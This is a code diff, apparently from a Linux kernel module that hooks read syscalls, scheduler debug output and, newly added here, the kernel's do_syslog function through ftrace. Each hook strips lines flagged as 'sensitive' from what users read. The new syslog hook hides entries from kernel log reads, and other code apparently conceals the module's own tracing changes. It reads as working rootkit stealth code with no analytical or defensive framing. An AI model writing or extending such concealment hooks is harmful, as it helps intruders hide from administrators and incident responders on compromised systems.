@@ -5,8 +5,13 @@
 extern char saved_ftrace_value[64];
 extern bool ftrace_write_intercepted;
 
-#define MAX_CAP (64*1024)
+#define MAX_CAP (1024*1024)
 #define MIN_KERNEL_READ 256
+
+#define SYSLOG_ACTION_READ       2
+#define SYSLOG_ACTION_READ_ALL   3
+#define SYSLOG_ACTION_READ_CLEAR 4
+
 
 static DEFINE_SPINLOCK(ftrace_read_lock);
 static unsigned long last_ftrace_read_jiffies = 0;
@@ -24,6 +29,7 @@ static asmlinkage ssize_t (*orig_preadv_ia32)(const struct pt_regs *regs);
 static asmlinkage ssize_t (*orig_readv)(const struct pt_regs *regs);
 static asmlinkage ssize_t (*orig_readv_ia32)(const struct pt_regs *regs);
 static int (*orig_sched_debug_show)(struct seq_file *m, void *v);
+static int (*orig_do_syslog)(int type, char __user *buf, int len, int source);
 
 notrace static bool line_contains_sensitive_info(const char *line);
 
@@ -138,19 +144,19 @@ static notrace ssize_t filter_trace_output(char __user *user_buf, ssize_t bytes_
         if (bytes_read > MAX_CAP)
             bytes_read = MAX_CAP;
 
-        kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
+        kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
         if (!kernel_buf)
             return bytes_read;
 
         if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
-            kfree(kernel_buf);
+            kvfree(kernel_buf);
             return bytes_read;
         }
         kernel_buf[bytes_read] = '\0';
 
-        filtered_buf = kzalloc(bytes_read + 1, GFP_KERNEL);
+        filtered_buf = kvzalloc(bytes_read + 1, GFP_KERNEL);
         if (!filtered_buf) {
-            kfree(kernel_buf);
+            kvfree(kernel_buf);
             return bytes_read;
         }
 
@@ -181,19 +187,19 @@ static notrace ssize_t filter_trace_output(char __user *user_buf, ssize_t bytes_
         }
 
         if (filtered_len == 0) {
-            kfree(kernel_buf);
-            kfree(filtered_buf);
+            kvfree(kernel_buf);
+            kvfree(filtered_buf);
             return 0;
         }
 
         if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
-            kfree(kernel_buf);
-            kfree(filtered_buf);
+            kvfree(kernel_buf);
+            kvfree(filtered_buf);
             return -EFAULT;
         }
 
-        kfree(kernel_buf);
-        kfree(filtered_buf);
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
         return filtered_len;
     }
 
@@ -201,12 +207,12 @@ static notrace ssize_t filter_trace_output(char __user *user_buf, ssize_t bytes_
         bytes_read = MAX_CAP;
 
     if (!header_initialized) {
-        kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
+        kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
         if (!kernel_buf)
             return bytes_read;
 
         if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
-            kfree(kernel_buf);
+            kvfree(kernel_buf);
             return bytes_read;
         }
         kernel_buf[bytes_read] = '\0';
@@ -236,7 +242,7 @@ static notrace ssize_t filter_trace_output(char __user *user_buf, ssize_t bytes_
 
         frozen_header[frozen_header_len] = '\0';
         header_initialized = true;
-        kfree(kernel_buf);
+        kvfree(kernel_buf);
     }
 
     if (frozen_header_len == 0)
@@ -306,28 +312,28 @@ notrace static ssize_t filter_buffer_content(char __user *user_buf, ssize_t byte
     if (bytes_read > MAX_CAP)
         bytes_read = MAX_CAP;
 
-    kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
+    kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
     if (!kernel_buf)
         return -ENOMEM;
     if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
-        kfree(kernel_buf);
+        kvfree(kernel_buf);
         return -EFAULT;
     }
     kernel_buf[bytes_read] = '\0';
 
     total_len = bytes_read;
-    total_buf = kmalloc(total_len + 1, GFP_KERNEL);
+    total_buf = kvmalloc(total_len + 1, GFP_KERNEL);
     if (!total_buf) {
-        kfree(kernel_buf);
+        kvfree(kernel_buf);
         return -ENOMEM;
     }
     memcpy(total_buf, kernel_buf, bytes_read);
     total_buf[total_len] = '\0';
 
-    filtered_buf = kzalloc(total_len + 1, GFP_KERNEL);
+    filtered_buf = kvzalloc(total_len + 1, GFP_KERNEL);
     if (!filtered_buf) {
-        kfree(kernel_buf);
-        kfree(total_buf);
+        kvfree(kernel_buf);
+        kvfree(total_buf);
         return -ENOMEM;
     }
 
@@ -348,22 +354,22 @@ notrace static ssize_t filter_buffer_content(char __user *user_buf, ssize_t byte
     }
 
     if (filtered_len == 0) {
-        kfree(kernel_buf);
-        kfree(total_buf);
-        kfree(filtered_buf);
+        kvfree(kernel_buf);
+        kvfree(total_buf);
+        kvfree(filtered_buf);
         return 0;
     }
 
     if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
-        kfree(kernel_buf);
-        kfree(total_buf);
-        kfree(filtered_buf);
+        kvfree(kernel_buf);
+        kvfree(total_buf);
+        kvfree(filtered_buf);
         return -EFAULT;
     }
 
-    kfree(kernel_buf);
-    kfree(total_buf);
-    kfree(filtered_buf);
+    kvfree(kernel_buf);
+    kvfree(total_buf);
+    kvfree(filtered_buf);
     return filtered_len;
 }
 
@@ -406,19 +412,19 @@ notrace static ssize_t read_and_filter(struct file *file, char __user *user_buf,
     if (to_read > MAX_CAP)
         to_read = MAX_CAP;
 
-    kbuf = kmalloc(to_read + 1, GFP_KERNEL);
+    kbuf = kvmalloc(to_read + 1, GFP_KERNEL);
     if (!kbuf)
         return -ENOMEM;
 
     pos = file->f_pos;
     got = kernel_read(file, kbuf, to_read, &pos);
     if (got < 0) {
-        kfree(kbuf);
+        kvfree(kbuf);
         return -EOPNOTSUPP;
     }
     file->f_pos = pos;
     if (got == 0) {
-        kfree(kbuf);
+        kvfree(kbuf);
         return 0;
     }
     if (got > to_read)
@@ -426,18 +432,18 @@ notrace static ssize_t read_and_filter(struct file *file, char __user *user_buf,
     kbuf[got] = '\0';
 
     total_len = got;
-    total_buf = kmalloc(total_len + 1, GFP_KERNEL);
+    total_buf = kvmalloc(total_len + 1, GFP_KERNEL);
     if (!total_buf) {
-        kfree(kbuf);
+        kvfree(kbuf);
         return -ENOMEM;
     }
     memcpy(total_buf, kbuf, got);
     total_buf[total_len] = '\0';
 
-    filtered = kzalloc(total_len + 1, GFP_KERNEL);
+    filtered = kvzalloc(total_len + 1, GFP_KERNEL);
     if (!filtered) {
-        kfree(kbuf);
-        kfree(total_buf);
+        kvfree(kbuf);
+        kvfree(total_buf);
         return -ENOMEM;
     }
 
@@ -458,24 +464,24 @@ notrace static ssize_t read_and_filter(struct file *file, char __user *user_buf,
     }
 
     if (filtered_len == 0) {
-        kfree(kbuf);
-        kfree(total_buf);
-        kfree(filtered);
+        kvfree(kbuf);
+        kvfree(total_buf);
+        kvfree(filtered);
         return 0;
     }
 
     to_copy = (filtered_len > user_count) ? user_count : filtered_len;
     if (copy_to_user(user_buf, filtered, to_copy)) {
-        kfree(kbuf);
-        kfree(total_buf);
-        kfree(filtered);
+        kvfree(kbuf);
+        kvfree(total_buf);
+        kvfree(filtered);
         return -EFAULT;
     }
 
     ret = (ssize_t)to_copy;
-    kfree(kbuf);
-    kfree(total_buf);
-    kfree(filtered);
+    kvfree(kbuf);
+    kvfree(total_buf);
+    kvfree(filtered);
     return ret;
 }
 
@@ -490,19 +496,19 @@ notrace static ssize_t filter_trace_pipe_output(char __user *user_buf, ssize_t b
     if (bytes_read > MAX_CAP)
         bytes_read = MAX_CAP;
 
-    kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
+    kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
     if (!kernel_buf)
         return bytes_read;
 
     if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
-        kfree(kernel_buf);
+        kvfree(kernel_buf);
         return bytes_read;
     }
     kernel_buf[bytes_read] = '\0';
 
-    filtered_buf = kzalloc(bytes_read + 1, GFP_KERNEL);
+    filtered_buf = kvzalloc(bytes_read + 1, GFP_KERNEL);
     if (!filtered_buf) {
-        kfree(kernel_buf);
+        kvfree(kernel_buf);
         return bytes_read;
     }
 
@@ -533,19 +539,19 @@ notrace static ssize_t filter_trace_pipe_output(char __user *user_buf, ssize_t b
     }
 
     if (filtered_len == 0) {
-        kfree(kernel_buf);
-        kfree(filtered_buf);
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
         return 0;
     }
 
     if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
-        kfree(kernel_buf);
-        kfree(filtered_buf);
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
         return -EFAULT;
     }
 
-    kfree(kernel_buf);
-    kfree(filtered_buf);
+    kvfree(kernel_buf);
+    kvfree(filtered_buf);
     return filtered_len;
 }
 
@@ -1153,6 +1159,102 @@ static notrace int hook_sched_debug_show(struct seq_file *m, void *v) {
     return ret;
 }
 
+static notrace int hook_do_syslog(int type, char __user *user_buf, int len, int source)
+{
+    int ret, orig_ret;
+    char *kernel_buf, *filtered_buf, *line_start, *line_end;
+    size_t filtered_len = 0;
+    size_t alloc_size;
+
+    if (!orig_do_syslog)
+        return -EINVAL;
+
+    if (type != SYSLOG_ACTION_READ && type != SYSLOG_ACTION_READ_ALL && type != SYSLOG_ACTION_READ_CLEAR)
+        return orig_do_syslog(type, user_buf, len, source);
+
+    if (!user_buf || len <= 0)
+        return orig_do_syslog(type, user_buf, len, source);
+
+    ret = orig_do_syslog(type, user_buf, len, source);
+    orig_ret = ret;
+    
+    if (ret <= 0)
+        return ret;
+
+    alloc_size = ret;
+    if (alloc_size > MAX_CAP)
+        alloc_size = MAX_CAP;
+
+    kernel_buf = kvmalloc(alloc_size + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return ret;
+
+    if (copy_from_user(kernel_buf, user_buf, alloc_size)) {
+        kvfree(kernel_buf);
+        return ret;
+    }
+    kernel_buf[alloc_size] = '\0';
+
+    filtered_buf = kvzalloc(alloc_size + 1, GFP_KERNEL);
+    if (!filtered_buf) {
+        kvfree(kernel_buf);
+        return ret;
+    }
+
+    line_start = kernel_buf;
+    while ((line_end = strchr(line_start, '\n'))) {
+        size_t line_len = line_end - line_start;
+        char saved = *line_end;
+        *line_end = '\0';
+
+        if (!line_contains_sensitive_info(line_start)) {
+            if (filtered_len + line_len + 1 <= alloc_size) {
+                memcpy(filtered_buf + filtered_len, line_start, line_len);
+                filtered_len += line_len;
+                filtered_buf[filtered_len++] = '\n';
+            }
+        }
+
+        *line_end = saved;
+        line_start = line_end + 1;
+    }
+
+    if (*line_start && !line_contains_sensitive_info(line_start)) {
+        size_t remaining = strlen(line_start);
+        if (filtered_len + remaining <= alloc_size) {
+            memcpy(filtered_buf + filtered_len, line_start, remaining);
+            filtered_len += remaining;
+        }
+    }
+
+    if (filtered_len == 0) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        if (clear_user(user_buf, orig_ret)) {
+            return -EFAULT;
+        }
+        return 0;
+    }
+
+    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        return -EFAULT;
+    }
+    
+    if (filtered_len < orig_ret) {
+        if (clear_user(user_buf + filtered_len, orig_ret - filtered_len)) {
+            kvfree(kernel_buf);
+            kvfree(filtered_buf);
+            return -EFAULT;
+        }
+    }
+
+    kvfree(kernel_buf);
+    kvfree(filtered_buf);
+    return (int)filtered_len;
+}
+
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_read", hook_read, &orig_read),
     HOOK("__ia32_sys_read", hook_read_ia32, &orig_read_ia32),
@@ -1162,6 +1264,7 @@ static struct ftrace_hook hooks[] = {
     HOOK("__ia32_sys_readv", hook_readv_ia32, &orig_readv_ia32),
     HOOK("__x64_sys_preadv", hook_preadv, &orig_preadv),
     HOOK("__ia32_sys_preadv", hook_preadv_ia32, &orig_preadv_ia32),
+    HOOK("do_syslog", hook_do_syslog, &orig_do_syslog),
     HOOK("sched_debug_show", hook_sched_debug_show, &orig_sched_debug_show),
 };
 
